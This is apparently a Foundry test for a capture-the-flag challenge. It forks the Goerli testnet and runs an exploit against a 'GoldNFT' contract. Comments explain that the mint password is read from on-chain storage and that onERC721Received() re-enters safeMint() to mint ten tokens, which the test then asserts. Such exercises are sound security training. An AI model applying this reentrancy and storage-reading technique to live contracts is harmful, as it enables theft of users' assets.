// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";
import {GoldNFTAttack} from "../src/GoldNFTAttack.sol";

// Decompiled PassManager: https://library.dedaub.com/decompile?md5=a22943a18c46dcfe283be3bc8a5466b3
/*
https://goerli.etherscan.io/tx/0x88fc0f1dd855405d092fc408c3311e7131477ec201f39344c4f002371c23f81c#statechange - DEPLOY TXT
state changed in slot 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe from 0x0 to 0x0000000000000000000000000000000000000000000000000000000000000001 (True)
so 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe will be a password to mint a NFTs
to mint 10 we gonna use a reentrency of safeMint(), every time onERC721Received() is triggered

We need to implement our  onERC721Received() that will call takeONEnft() (in reentrency minted will be still false)
*/

contract GoldNFTAttackScenario is Test {
    GoldNFT nft;
    GoldNFTAttack nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866); 
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        nftHack = new GoldNFTAttack(address(nft));
        nftHack.attack();

        assertEq(nft.balanceOf(hacker), 10);
    }
}